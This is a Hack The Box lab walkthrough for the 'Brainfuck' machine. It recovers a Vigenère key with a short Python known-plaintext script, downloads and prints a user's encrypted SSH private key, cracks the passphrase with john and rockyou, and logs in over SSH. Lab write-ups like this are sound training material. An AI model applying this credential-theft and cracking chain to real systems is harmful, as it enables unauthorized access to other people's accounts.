# 20 - SuperSecretForum

# Logging in as orestis with the new credentials.
![](vx_images/174566731675.png)


# SSH Access Post
Apparently, admin is informing other users about new ssh login policy. Notice how user Orestis signs his messages.
![](vx_images/238306336439.png)

# Encrypted post
![](vx_images/2752236094865.png)

At this point, we should be aware of the signature which is **Orestis - Hacking for fun and profit**. This encryption is subject to [Known Plain Text Attack](https://en.wikipedia.org/wiki/Known-plaintext_attack)

The plain text and the cypher text are known to us, the missing pieces of the puzzle are the encryption method and the key.

# Vigenère Cipher

The Vigenère cipher is a method of encrypting **alphabetic text** by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It employs a form of polyalphabetic substitution.

<a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher"><p style="text-align:right;">- Wikipedia </a></p>

The space character and the dash are not encrypted in our cyphertext either, there is a stong possibility that we are dealing with Vigenere encryption.

A quick google search "vigenere known plaintext attack" points us to [this post](https://crypto.stackexchange.com/questions/12195/find-the-key-to-a-vigen%C3%A8re-cipher-given-known-ciphertext-and-plaintext) on crypto.stackexchange.com

# Python implementation of the formula from stackexchange
Don't forget to remove nonalphabetic characters

```py
#vigenere.py
import string
alphabet=string.ascii_lowercase
plaintext ='OrestisHackingforfunandprofit'
ciphertext ='PieagnmJkoijegnbwzwxmlegrwsnn'
key = ''

for i in range(len(plaintext)):
    dec = (ord(ciphertext[i])-ord(plaintext[i])) % 26
    key += alphabet[dec]
print(key)
```

# Key
```py
┌──(kali㉿kali)-[10.10.14.9/23]-[~/htb/brainfuck]
└─$ python3  vigenere.py 
brainfuckmybrainfuckmybrainfu
```

# A Web Based Decryption Tool rumkin.com

 ![](vx_images/1028708737496.png)

Let's download his private key and take a look at it.

```bash
┌──(kali㉿kali)-[10.10.14.9/23]-[~/htb/brainfuck]
└─$ wget https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
┌──(kali㉿kali)-[10.10.14.9/23]-[~/htb/brainfuck]
└─$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

# Cracking the passphrase of the private key by using john 

Luckly, we know that it's crackable

![](vx_images/2108448118321.png)

# Setting up the environment for john

Let's download and run ss2tojohn.py

```bash
┌──(kali㉿kali)-[10.10.14.9/23]-[~/htb/brainfuck]
└─$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
┌──(kali㉿kali)-[10.10.14.9/23]-[~/htb/brainfuck]
└─$ python3 ssh2john id_rsa > id_rsa.john
──(kali㉿kali)-[10.10.14.9/23]-[~/htb/brainfuck]
└─$ john id_rsa.john -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
1g 0:00:00:03 DONE (2021-05-27 19:18) 0.2732g/s 3918Kp/s 3918Kc/s 3918KC/sa6_123..*7¡Vamos!
Session completed
```


# SSH
```bash
──(kali㉿kali)-[10.10.14.9/23]-[~/htb/brainfuck]
└─$ ssh -l orestis -i id_rsa brainfuck.htb
Enter passphrase for key 'id_rsa': 3poulakia!
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
orestis@brainfuck:~$ 
```
